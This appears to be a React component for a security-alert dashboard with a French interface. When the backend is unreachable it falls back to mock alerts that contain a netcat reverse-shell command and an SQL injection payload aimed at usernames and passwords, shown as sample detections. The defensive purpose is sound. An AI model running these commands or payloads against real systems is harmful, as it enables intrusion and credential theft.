import React, { useState, useEffect } from 'react'
import {
  Card,
  CardContent,
  Typography,
  Box,
  Grid,
  Chip,
  Paper,
  Divider,
  Button
} from '@mui/material'
import {
  Warning as AlertIcon,
  Shield as ShieldIcon,
  Check as ResolveIcon
} from '@mui/icons-material'

export default function Alerts() {
  const [alerts, setAlerts] = useState<any[]>([])

  const fetchAlerts = () => {
    fetch('/api/alerts?limit=50')
      .then(res => res.json())
      .then(data => setAlerts(data))
      .catch(err => {
        console.error("Failed to load alerts. Loading mocks.", err)
        // Mocks
        const mockAlerts = [
          {
            id: 1,
            timestamp: new Date().toISOString(),
            source: 'Tetragon',
            classification: 'MALICIOUS',
            severity: 'CRITICAL',
            confidence: 98.0,
            explanation: 'Reverse shell detected: process exec /usr/bin/nc -e /bin/bash',
            recommendation: 'Isolate container, restrict pod runtime permissions and rotate Secrets.',
            raw_log: 'tetragon: exec pid=1240 /usr/bin/nc -e /bin/bash 10.244.1.12'
          },
          {
            id: 2,
            timestamp: new Date(Date.now() - 30 * 60000).toISOString(),
            source: 'Falco',
            classification: 'MALICIOUS',
            severity: 'HIGH',
            confidence: 92.0,
            explanation: 'Rule: Write below binary dir - File modified: /usr/bin/wget by root user',
            recommendation: 'Verify integrity of system binaries, enable read-only root filesystems.',
            raw_log: 'falco_alert: syscall=write file=/usr/bin/wget user=root'
          },
          {
            id: 3,
            timestamp: new Date(Date.now() - 60 * 60000).toISOString(),
            source: 'Istio',
            classification: 'MALICIOUS',
            severity: 'CRITICAL',
            confidence: 97.0,
            explanation: "SQL Injection payload detected from 185.220.101.5 in request parameter 'id': 'union select username, password from users'",
            recommendation: 'Block origin IP in Ingress gateway and inspect backend database query parameter binding.',
            raw_log: 'istio_gateway: path=/portal/search?id=%27%20union%20select%20username,%20password%20from%20users'
          },
          {
            id: 4,
            timestamp: new Date(Date.now() - 90 * 60000).toISOString(),
            source: 'Wazuh',
            classification: 'SUSPICIOUS',
            severity: 'HIGH',
            confidence: 85.0,
            explanation: 'Possible SSH brute-force attack detected. 5 failed login attempts in 10s.',
            recommendation: 'Enforce fail2ban rule on host machine and block originating IP.',
            raw_log: 'wazuh_siem: ruleset_id=1244 SSH login failed'
          }
        ]
        setAlerts(mockAlerts)
      })
  }

  useEffect(() => {
    fetchAlerts()

    const wsListener = () => {
      fetchAlerts()
    }
    window.addEventListener('ws-alert-received', wsListener)
    return () => window.removeEventListener('ws-alert-received', wsListener)
  }, [])

  return (
    <Box>
      <Box sx={{ mb: 4 }}>
        <Typography variant="h4" sx={{ fontFamily: 'Outfit', fontWeight: 800, mb: 1, color: '#fff' }}>
          Alertes de Sécurité Actives
        </Typography>
        <Typography variant="body1" color="text.secondary">
          Vérifiez les menaces et suspicions immédiates détectées et classifiées par le modèle IA.
        </Typography>
      </Box>

      {alerts.length === 0 ? (
        <Paper sx={{ p: 4, textAlign: 'center', bgcolor: 'background.paper', border: '1px solid rgba(255,255,255,0.08)' }}>
          <ShieldIcon sx={{ fontSize: 60, color: 'success.main', mb: 2 }} />
          <Typography variant="h6">Aucune alerte active</Typography>
          <Typography variant="body2" color="text.secondary">
            Le modèle de sécurité IA n'a détecté aucune menace dans les logs reçus. Tout est sous contrôle !
          </Typography>
        </Paper>
      ) : (
        <Grid container spacing={3}>
          {alerts.map((alert) => {
            const isMalicious = alert.classification === 'MALICIOUS'
            const borderCol = isMalicious ? '#ff1744' : '#ff9100'
            const bgCol = isMalicious ? 'rgba(255, 23, 68, 0.03)' : 'rgba(255, 145, 0, 0.03)'

            return (
              <Grid item xs={12} key={alert.id}>
                <Card
                  sx={{
                    borderLeft: `5px solid ${borderCol}`,
                    bgcolor: bgCol,
                    '&:hover': { boxShadow: '0 8px 40px rgba(0,0,0,0.5)' }
                  }}
                >
                  <CardContent>
                    <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 1, mb: 2 }}>
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
                        <AlertIcon sx={{ color: borderCol }} />
                        <Typography variant="h6" sx={{ fontWeight: 800, fontFamily: 'Outfit' }}>
                          Alerte depuis {alert.source}
                        </Typography>
                        <Chip
                          label={alert.classification}
                          color={isMalicious ? 'error' : 'warning'}
                          size="small"
                          sx={{ fontWeight: 'bold' }}
                        />
                        <Chip label={alert.severity} variant="outlined" color={alert.severity === 'CRITICAL' ? 'error' : 'default'} size="small" />
                      </Box>
                      <Typography variant="caption" color="text.secondary" sx={{ fontFamily: 'monospace' }}>
                        {new Date(alert.timestamp).toLocaleString()}
                      </Typography>
                    </Box>

                    <Typography variant="body1" sx={{ fontWeight: 600, mb: 2 }}>
                      {alert.explanation}
                    </Typography>

                    <Grid container spacing={2} sx={{ mb: 2 }}>
                      <Grid item xs={12} sm={4}>
                        <Typography variant="caption" color="text.secondary" display="block">CONFIANCE IA</Typography>
                        <Typography variant="h6" sx={{ fontWeight: 900, color: 'primary.main' }}>
                          {alert.confidence.toFixed(1)}%
                        </Typography>
                      </Grid>
                      <Grid item xs={12} sm={8}>
                        <Typography variant="caption" color="text.secondary" display="block">RECOMMANDATION IA</Typography>
                        <Typography variant="body2" sx={{ color: 'primary.main', fontWeight: 600 }}>
                          {alert.recommendation}
                        </Typography>
                      </Grid>
                    </Grid>

                    <Divider sx={{ my: 2, borderColor: 'rgba(255,255,255,0.06)' }} />

                    <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 2 }}>
                      <Box sx={{ p: 1, bgcolor: '#0d1117', borderRadius: 1.5, border: '1px solid rgba(255,255,255,0.04)', flexGrow: 1, maxWidth: '80%' }}>
                        <Typography variant="caption" sx={{ fontFamily: 'monospace', color: '#8b949e', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', display: 'block' }}>
                          Raw: {alert.raw_log}
                        </Typography>
                      </Box>
                      <Button variant="outlined" size="small" startIcon={<ResolveIcon />} color="success" sx={{ border: '1px solid rgba(0, 230, 118, 0.3)' }}>
                        Investiguer
                      </Button>
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            )
          })}
        </Grid>
      )}
    </Box>
  )
}
